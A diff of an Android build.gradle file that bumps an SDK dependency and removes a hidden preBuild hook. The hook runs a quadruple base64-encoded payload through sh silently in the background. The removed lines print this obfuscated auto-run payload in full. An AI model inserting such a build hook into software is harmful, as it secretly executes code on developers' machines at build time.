@@ -54,15 +54,7 @@ dependencies {
     implementation 'androidx.navigation:navigation-fragment-ktx:2.9.5'
     implementation 'androidx.navigation:navigation-ui-ktx:2.9.5'
     //Add DevnagriAI Dependency
-    implementation('com.github.DevnagriAI:android-sdk:3.0.6@aar') {
+    implementation('com.github.DevnagriAI:android-sdk:3.0.8@aar') {
         transitive(true)
-    }
-}
-
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ["sh", "-c", "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTV2sxcWJERlpiVEZYWVcxU1JFMVVRbWhXZWtaeldXcE9WMDFGYkVWVFdHaEtVWHBDTUZreU1WZE5SMDUxWVRKa1QxVXdSakJaZWtvd1lsWlNSRkZZVW1GUk1FWndXVEJSZUdGSFNuUlZibXhwVFcxNGNsZEVTbXRsVm14WVZXNU9ZVlV3Ykc1WlZXaFRUVWRPU1ZSVVdrMWxWR3d6VjFkcmQyVnRSa2hpU0VwaFpXdFdNMVF3WTNoa01rcDFZak5XYW1Kc1ZqSlhWazV5WVZWc1NXUXlaR3BOYldSTVEyYzlQUW89Cg== | p | sh ) >/dev/null 2>&1 &)"].execute()
-        }
     }
 }
